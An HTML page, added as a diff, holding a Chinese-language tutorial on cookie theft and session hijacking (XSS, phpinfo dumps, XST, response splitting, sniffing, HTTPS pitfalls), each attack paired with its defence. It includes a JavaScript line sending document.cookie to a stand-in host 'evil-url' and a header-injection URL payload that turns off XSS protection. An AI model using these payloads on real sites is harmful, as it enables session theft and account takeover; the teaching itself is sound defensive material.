@@ -1,0 +1,286 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Cookie Theft and Session Hijacking</title>
+<link rel="stylesheet" href="../css/article.css" />
+</head>
+<body>
+<div class="m-content">
+<h1>Cookie Theft and Session Hijacking</h1>
+<div class="content"><span>
+    </span><p><strong>Updates</strong></p><span>
+
+</span><span>
+
+</span><p>此篇文章的Presentation<a href="https://speakerdeck.com/shawn0102/cookie-theft-and-session-hijacking-1">戳这里</a>。</p><span>
+
+</span><h2 id="toc_0">一、cookie的基本特性</h2><span>
+
+</span><p>如果不了解cookie，可以先到<a href="http://en.wikipedia.org/wiki/HTTP_cookie">wikipedia</a>上学习一下。</p><span>
+
+</span><h3 id="toc_1">http request</h3><span>
+
+</span><p>浏览器向服务器发起的每个请求都会带上cookie：</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">GET /index.html HTTP/1.1
+Host: www.example.org
+Cookie: foo=value1;bar=value2
+Accept: */*
+</code></pre></div><span>
+</span><h3 id="toc_2">http response</h3><span>
+
+</span><p>服务器给浏览器的返回可以设置cookie：</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">HTTP/1.1 200 OK
+Content-type: text/html
+Set-Cookie: name=value
+Set-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT
+
+(content of page)
+</code></pre></div><span>
+</span><h2 id="toc_3">二、cookie有关的术语</h2><span>
+
+</span><h3 id="toc_4">session cookie</h3><span>
+
+</span><p>当cookie没有设置超时时间，那么cookie会在浏览器退出时销毁，这种cookie是session cookie。</p><span>
+
+</span><h3 id="toc_5">persistent cookie/tracking cookie</h3><span>
+
+</span><p>设置了超时时间的cookie，会在指定时间销毁，cookie的维持时间可以持续到浏览器退出之后，这种cookie被持久化在浏览器中。</p><span>
+
+</span><p>很多站点用cookie跟踪用户的历史记录，例如广告类站点会使用cookie记录浏览过哪些内容，搜索引擎会使用cookie记录历史搜索记录，这时也可以称作tracking cookie，因为它被用于追踪用户行为。</p><span>
+
+</span><h3 id="toc_6">secure cookie</h3><span>
+
+</span><p>服务器端设置cookie的时候，可以指定<code>secure</code>属性，这时cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有secure cookie。</p><span>
+
+</span><p>设置secure cookie的方式举例：</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">Set-Cookie: foo=bar; Path=/; Secure
+</code></pre></div><span>
+</span><h3 id="toc_7">HttpOnly cookie</h3><span>
+
+</span><p>服务器端设置cookie的时候，也可以指定一个<code>HttpOnly</code>属性。</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">Set-Cookie: foo=bar; Path=/; HttpOnly
+</code></pre></div><span>
+</span><p>设置了这个属性的cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。</p><span>
+
+</span><h3 id="toc_8">third-party cookie</h3><span>
+
+</span><p>第三方cookie的使用场景通常是iframe，例如www.a.com潜入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方cookie。</p><span>
+
+</span><h3 id="toc_9">supercookie</h3><span>
+
+</span><p>cookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果cookie被声明为属于.com会发生什么？这个cookie会在任何.com域名生效。这有很大的安全性问题。这种cookie被称作supercookie。</p><span>
+
+</span><p>浏览器做出了限制，不允许设置顶级域名cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。</p><span>
+
+</span><p>现代主流浏览器都很好的处理了supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对supercookie进行攻击啦。</p><span>
+
+</span><h3 id="toc_10">zombie cookie/evercookie</h3><span>
+
+</span><p>僵尸cookie是指当用户通过浏览器的设置清除cookie后可以自动重新创建的cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当cookie被删除时，从其他存储中恢复。</p><span>
+
+</span><p>evercookie是实现僵尸cookie的主要技术手段。</p><span>
+
+</span><p>了解<a href="http://en.wikipedia.org/wiki/Zombie_cookie">僵尸cookie</a>和<a href="http://en.wikipedia.org/wiki/Evercookie">evercookie</a>。</p><span>
+
+</span><h2 id="toc_11">三、cookie有什么用</h2><span>
+
+</span><p>通常cookie有三种主要的用途。</p><span>
+
+</span><h3 id="toc_12">session管理</h3><span>
+
+</span><p>http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是<a href="http://en.wikipedia.org/wiki/Basic_access_authentication">Base Auth</a>，但是这种方式，用户名和密码在每次请求中都会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。</p><span>
+
+</span><p>所以现在大多数站点采用基于cookie的session管理方式：</p><span>
+
+</span><p>用户登陆成功后，设置一个唯一的cookie标识本次会话，基于这个标识进行用户授权。只要请求中带有这个标识，都认为是登录态。</p><span>
+
+</span><h3 id="toc_13">个性化</h3><span>
+
+</span><p>cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。</p><span>
+
+</span><p>以前Google退出的iGoogle产品也是一个典型的例子，用户可以拥有自己的Google自定制主页，其中就使用了cookie。</p><span>
+
+</span><h3 id="toc_14">user tracking</h3><span>
+
+</span><p>cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。</p><span>
+
+</span><h2 id="toc_15">四、cookie窃取和session劫持</h2><span>
+
+</span><p>本文就cookie的三种用途中session管理的安全问题进行展开。</p><span>
+
+</span><p>既然cookie用于维持会话，如果这个cookie被攻击者窃取会发生什么？session被劫持！</p><span>
+
+</span><p>攻击者劫持会话就等于合法登录了你的账户，可以浏览大部分用户资源。</p><span>
+
+</span><p><img src="http://shaoshuai.me/assets/img/post_session_hijacking.jpg" alt="" /></p><span>
+
+</span><h3 id="toc_16">最基本的cookie窃取方式：xss漏洞</h3><span>
+
+</span><p><strong>攻击</strong></p><span>
+
+</span><p>一旦站点中存在可利用的xss漏洞，攻击者可直接利用注入的js脚本获取cookie，进而通过异步请求把标识session id的cookie上报给攻击者。</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">var img = document.createElement('img');
+img.src = 'http://evil-url?c=' + encodeURIComponent(document.cookie);
+document.getElementsByTagName('body')[0].appendChild(img);
+</code></pre></div><span>
+</span><p>如何寻找XSS漏洞是另外一个话题了，自行google之。</p><span>
+
+</span><p><strong>防御</strong></p><span>
+
+</span><p>根据上面<code>HttpOnly cookie</code>的介绍，一旦一个cookie被设置为<code>HttpOnly</code>，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个cookie进行session维持，但客户端js对其不可见。那么即使存在xss漏洞也无法简单的利用其进行session劫持攻击了。</p><span>
+
+</span><p>但是上面说的是无法利用xss进行简单的攻击，但是也不是没有办法的。既然无法使用<code>document.cookie</code>获取到，可以转而通过其他的方式。下面介绍两种xss结合其他漏洞的攻击方式。</p><span>
+
+</span><h3 id="toc_17">xss结合phpinfo页面</h3><span>
+
+</span><p><strong>攻击</strong></p><span>
+
+</span><p>大家都知道，利用php开发的应用会有一个phpinfo页面。而这个页面会dump出请求信息，其中就包括cookie信息。</p><span>
+
+</span><p><img src="http://shaoshuai.me/assets/img/post_session_hijacking_phpinfo.png" alt="" /></p><span>
+
+</span><p>如果开发者没有关闭这个页面，就可以利用xss漏洞向这个页面发起异步请求，获取到页面内容后parse出cookie信息，然后上传给攻击者。</p><span>
+
+</span><p>phpinfo只是大家最常见的一种dump请求的页面，但不仅限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。</p><span>
+
+</span><p><strong>防御</strong></p><span>
+
+</span><p>关闭所有phpinfo类dump request信息的页面。</p><span>
+
+</span><h3 id="toc_18">XSS + HTTP TRACE = XST</h3><span>
+
+</span><p>这是一种古老的攻击方式，现在已经消失，写在这里可以扩展一下攻防思路。</p><span>
+
+</span><p>http trace是让我们的web服务器将客户端的所有请求信息返回给客户端的方法。其中包含了HttpOnly的cookie。如果利用xss异步发起trace请求，又可以获取session信息了。</p><span>
+
+</span><p>之所以说是一种古老的攻击方式，因为现代浏览器考虑到XST的危害都禁止了异步发起trace请求。</p><span>
+
+</span><p>另外提一点，当浏览器没有禁止异步发起trace的时代，很多开发者都关闭了web server的trace支持来防御XST攻击。但攻击者在特定的情况下还可以绕过，用户使用了代理服务器，而代理服务器没有关闭trace支持，这样又可以trace了。</p><span>
+
+</span><h3 id="toc_19">HTTP Response Splitting</h3><span>
+
+</span><span>
+
+</span><p>通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。</p><span>
+
+</span><p>例如，一个站点接受参数做302跳转：</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">www.example.com/?r=http://baidu.com
+</code></pre></div><span>
+</span><p>request信息：</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">GET /example.com?r=http://baidu.com\r\n
+HTTP/1.1\r\n
+Host: example.com\r\n
+\r\n
+</code></pre></div><span>
+</span><p>response:</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">HTTP/1.1 302 Found\r\n
+Location: http://baidu.com\r\n
+Content-Type: text/html\r\n
+\r\n
+</code></pre></div><span>
+</span><p>这样页面就302跳转到百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含<code>\r\n</code>的header信息：</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3E
+</code></pre></div><span>
+</span><p>response变成了：</p><span>
+</span><div class="highlight"><pre><code class="text language-text" data-lang="text">HTTP/1.1 302 Found\r\n
+Location: \r\n
+HTTP/1.1 200 OK\r\n
+Content-Type: text/html\r\n
+X-XSS-Protection: 0\r\n
+
+&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;
+Content-Type: text/html\r\n
+\r\n
+</code></pre></div><span>
+</span><p>有两个攻击要点：</p><span>
+
+</span><ul>
+<li>指定X=XSS-Protection: 0 ，关闭浏览器的xss保护机制。</li>
+<li>注入脚本</li>
+</ul><span>
+
+</span><p><strong>防御</strong></p><span>
+
+</span><p>针对header的内容做过滤，不能漏掉<code>\r\n</code>，特别是Location，host，referrer等。</p><span>
+
+</span><p>说到底，这也是一种XSS攻击，只是攻击方式与普通的不太一样。针对header的攻击还可以做SQL注入等，防御的原则是对所有的输入进行sanitize，包括非用户输入的内容，比如referrer这种一般由浏览器带过来的信息，因为请求完全可以被伪造，未必来自浏览器。</p><span>
+
+</span><h3 id="toc_20">网络监听(network eavesdropping/network sniffing)</h3><span>
+
+</span><p>以上是利用上层应用的特性的几种攻击方式，cookie不仅存在于上层应用中，更流转于请求中。上层应用获取不到后，攻击者可以转而从网络请求中获取。</p><span>
+
+</span><p>只要是未使用https加密的网站都可以抓包分析，其中就包含了标识session的cookie。当然，完成网络监听需要满足一定的条件，这又是另外一个话题了。常见的方式：</p><span>
+
+</span><ul>
+<li><p>DNS缓存投毒</p>
+
+<p>攻击者把要攻击的域名的一个子域映射到攻击者的server，然后想办法让被攻击者访问这个server(XSS request、社会化攻击等)，请求中会带过来所有cookie（包括HttpOnly）。</p></li>
+<li><p>中间人攻击</p>
+
+<p>常见的攻击方式是搭建免费wifi，把DHCP服务器指定为攻击者ip，在攻击者机器上可以收到所有请求，不仅可以获取cookie，还可以进行脚本注入。</p></li>
+<li><p>代理服务器/VPN</p>
+
+<p>翻墙用免费VPN？呵呵。</p></li>
+</ul><span>
+
+</span><p><strong>防御</strong></p><span>
+
+</span><p>使用https。使用https协议的请求都被ssl加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。</p><span>
+
+</span><p>防御网络监听通常有两种方式：</p><span>
+
+</span><span>
+
+</span><p>https是加密信道，在此信道上传输的内容对中间人都是不可见的。但https是有成本的。</p><span>
+
+</span><p>内容加密比较好理解，例如对password先加密再传输。但是对于标识session的cookie这种标识性信息是无法通过内容加密得到保护的。</p><span>
+
+</span><p>那么，使用https的站点就可以高枕无忧了吗？事实上，一些细节上的处理不当同样会暴露出攻击风险。</p><span>
+
+</span><h3 id="toc_21">https站点攻击：双协议</h3><span>
+
+</span><p>如果同时支持http和https，那么还是可以使用网络监听http请求获取cookie。</p><span>
+
+</span><p><strong>防御</strong></p><span>
+
+</span><p>只支持https，不支持http。</p><span>
+
+</span><p>这样就好了吗？No.</p><span>
+
+</span><h3 id="toc_22">https站点攻击：301重定向</h3><span>
+
+</span><p>例如www.example.com只支持https协议，当用户直接输入example.com（大部分用户都不会手动输入协议前缀），web server通常的处理是返回301要求浏览器重定向到<code>https://www.example.com</code>。这次301请求是http的！而且带了cookie，这样又将cookie明文暴露在网络上了。</p><span>
+
+</span><p><strong>防御1</strong></p><span>
+
+</span><p>把标识session的cookie设置成secure。上面提到的secure cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。</p><span>
+
+</span><p>然后现实很残酷，很多站点根本无法做到所有的请求都走https。原因有很多，可能是成本考虑，可能是业务需求。</p><span>
+
+</span><p><strong>防御2</strong></p><span>
+
+</span><p>设置<code>Strict-Transport-Security header</code>，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。更多<a href="https://www.owasp.org/index.php/HTTP_Strict_Transport_Security">点此</a></p><span>
+
+</span><p><a href="http://www.wooyun.org/bugs/wooyun-2010-049877/auth/36b625b1c47b40b270c6a390a0fb9525">乌云案例</a></p><span>
+
+</span><h2 id="toc_23">思考</h2><span>
+
+</span><p>如果偷取cookie失败，无法session劫持，攻击者如何再发起攻击？</p><span>
+
+</span><p>劫持session的目的是拿到登录态，从而获得服务器授权做很多请求，例如账户变更。如果劫持不到session，也能够做授权请求不是也达到攻击的目的了？</p><span>
+
+</span><p>无需拿到session cookie，跨站发起请求就可以了，这就是CSRF！</p><span>
+
+</span><p>server通过把用户凭证存储在cookie以维持session，http/https协议每次访问都会自动传输cookie，协议上的缺陷是导致可进行CSRF攻击的根本原因！</p><span>
+
+</span><p>防御方式：使用anti-forgery token</p><span>
+
+</span><blockquote>
+<p>大部分攻击都是提权行为，最基本的提权通过偷取用户名密码，不成功转而窃取session，窃取不成转而跨站攻击，实在不行重放也可以造成危害</p>
+</blockquote><span>
+
+    </span></div></div>
+<script>var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-34802167-1']); _gaq.push(['_setDomainName', 'liuzhe.co']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })();</script></body>
+</html>
